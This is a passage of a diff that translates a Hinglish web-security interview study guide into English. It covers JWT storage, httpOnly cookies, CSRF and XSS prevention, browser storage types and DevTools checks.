+**Answer:** "Sir, storing JWT in LocalStorage is **not safe** because LocalStorage is accessible via JavaScript. If there's an XSS (Cross-Site Scripting) vulnerability in the website, attacker can steal the token via JavaScript. **Best practice** is to store JWT in **httpOnly cookies**, which are not accessible via JavaScript. Also always set `Secure` flag (HTTPS-only) and `SameSite=Strict` (CSRF protection)."
 
 ### Q: "Cookies vs LocalStorage for authentication — which is better?"
 
-**Answer:** "**httpOnly cookies** authentication ke liye better hain kyunki:
-1. **XSS Protection:** JavaScript se access nahi hoti, isliye XSS attacks se safe
-2. **Automatic Transmission:** Har request ke saath automatically bhej deti hain
-3. **Security Flags:** `httpOnly`, `Secure`, `SameSite` flags se additional security
+**Answer:** "**httpOnly cookies** are better for authentication because:
+1. **XSS Protection:** Not accessible via JavaScript, so safe from XSS attacks
+2. **Automatic Transmission:** Sent automatically with every request
+3. **Security Flags:** Additional security via `httpOnly`, `Secure`, `SameSite` flags
 
-LocalStorage XSS vulnerable hai kyunki JavaScript se directly accessible hai. Lekin LocalStorage ka use **non-sensitive data** jaise user preferences, theme settings ke liye karna safe hai."
+LocalStorage is XSS vulnerable because it's directly accessible via JavaScript. But LocalStorage is safe to use for **non-sensitive data** like user preferences, theme settings."
 
-### Q: "CSRF attack kya hai aur kaise prevent karein?"
+### Q: "What is CSRF attack and how to prevent it?"
 
-**Answer:** "CSRF (Cross-Site Request Forgery) attack mein attacker user ko kisi malicious site pe le jakar, uske browser se **unauthorized requests** bhejwata hai. Kyunki cookies automatically attach hoti hain, server ko lagta hai legitimate user ne request ki hai.
+**Answer:** "CSRF (Cross-Site Request Forgery) attack is when attacker takes user to a malicious site and sends **unauthorized requests** from user's browser. Since cookies are automatically attached, server thinks legitimate user made the request.
 
 **Prevention methods:**
-1. **SameSite Cookie Attribute:** `SameSite=Strict` ya `SameSite=Lax` set karein
-2. **CSRF Tokens:** Har form mein unique token include karein
-3. **Referer Header Check:** Cross-origin requests ko validate karein
-4. **Re-authentication:** Sensitive actions ke liye dobara password maangein"
+1. **SameSite Cookie Attribute:** Set `SameSite=Strict` or `SameSite=Lax`
+2. **CSRF Tokens:** Include unique token in every form
+3. **Referer Header Check:** Validate cross-origin requests
+4. **Re-authentication:** Ask for password again for sensitive actions"
 
-### Q: "XSS se kaise bachav karein?"
+### Q: "How to prevent XSS?"
 
-**Answer:** "XSS prevention ke liye multiple layers use karte hain:
-1. **Input Sanitization:** User input ko escape/encode karein before displaying
-2. **Content Security Policy (CSP):** `script-src 'self'` set karke external scripts block karein
-3. **httpOnly Cookies:** Sensitive data (tokens) ko httpOnly cookies mein store karein
-4. **Output Encoding:** HTML, JavaScript, URL context ke hisaab se encode karein
-5. **Framework Security:** React, Angular jaise frameworks automatically XSS prevent karte hain"
+**Answer:** "XSS prevention uses multiple layers:
+1. **Input Sanitization:** Escape/encode user input before displaying
+2. **Content Security Policy (CSP):** Set `script-src 'self'` to block external scripts
+3. **httpOnly Cookies:** Store sensitive data (tokens) in httpOnly cookies
+4. **Output Encoding:** Encode based on HTML, JavaScript, URL context
+5. **Framework Security:** Frameworks like React, Angular automatically prevent XSS"
 
-### Q: "LocalStorage, SessionStorage aur Cookies mein kya difference hai?"
+### Q: "What's the difference between LocalStorage, SessionStorage and Cookies?"
 
-**Answer:** "Teenon client-side storage hain par alag-alag use cases ke liye:
+**Answer:** "All three are client-side storage but for different use cases:
 
 | Aspect | Cookies | LocalStorage | SessionStorage |
 |--------|---------|--------------|----------------|
@@ -1008,9 +1009,9 @@ LocalStorage XSS vulnerable hai kyunki JavaScript se directly accessible hai. Le
 
 **Rule of thumb:** Auth tokens → httpOnly cookies, User preferences → LocalStorage, Temporary form data → SessionStorage."
 
-### Q: "Session cookies aur persistent cookies mein kya farak hai?"
+### Q: "What's the difference between session cookies and persistent cookies?"
 
-**Answer:** "**Session cookies** browser close karne pe automatically delete ho jate hain (no `Expires` or `Max-Age` set). **Persistent cookies** ek specific time tak rehte hain (`Expires` ya `Max-Age` set hota hai). Session cookies temporary sessions ke liye hote hain (jaise banking), persistent cookies 'Remember Me' functionality ke liye."
+**Answer:** "**Session cookies** are automatically deleted when browser closes (no `Expires` or `Max-Age` set). **Persistent cookies** stay for a specific time (`Expires` or `Max-Age` set). Session cookies are for temporary sessions (like banking), persistent cookies are for 'Remember Me' functionality."
 
 ---
 
@@ -1065,25 +1066,25 @@ LocalStorage XSS vulnerable hai kyunki JavaScript se directly accessible hai. Le
 
 ```
 1. Application Tab → Storage section:
-   - Cookies: Domain, path, expiration check karo
-   - Local Storage: Key-value pairs dekho
-   - Session Storage: Temporary data check karo
+   - Cookies: Check domain, path, expiration
+   - Local Storage: Check key-value pairs
+   - Session Storage: Check temporary data
 
 2. Security Tab:
-   - HTTPS status verify karo
-   - Mixed content warnings check karo
+   - Verify HTTPS status
+   - Check mixed content warnings
 
 3. Network Tab:
-   - Request headers mein cookies dekho
-   - Set-Cookie response headers check karo
+   - Check cookies in request headers
+   - Check Set-Cookie in response headers
 ```
 
 ---
 
 ## 🚀 Next Steps
 
-Ab tum **Topic 6: CORS** ke liye ready ho! CORS (Cross-Origin Resource Sharing) wo mechanism hai jo browser use karta hai cross-domain API calls ko control karne ke liye. Ye Web Storage ke baad natural next step hai kyunki dono hi browser security features hain.
+Now you're ready for **Topic 6: CORS**! CORS (Cross-Origin Resource Sharing) is the mechanism browser uses to control cross-domain API calls. It's the natural next step after Web Storage since both are browser security features.
 
 ---
 
-> **Pro Tip:** Interview mein security discuss karte waqt **defense-in-depth** approach mention karna — "Hum multiple layers of security use karte hain: httpOnly cookies for auth, CSP headers for XSS, SameSite for CSRF, aur input validation for data integrity." Ye dikhata hai ki tum holistic security mindset rakhte ho! 🔒
+> **Pro Tip:** When discussing security in an interview, always mention the **defense-in-depth** approach — "We use multiple layers of security: httpOnly cookies for auth, CSP headers for XSS, SameSite for CSRF, and input validation for data integrity." This shows you have a holistic security mindset! 🔒
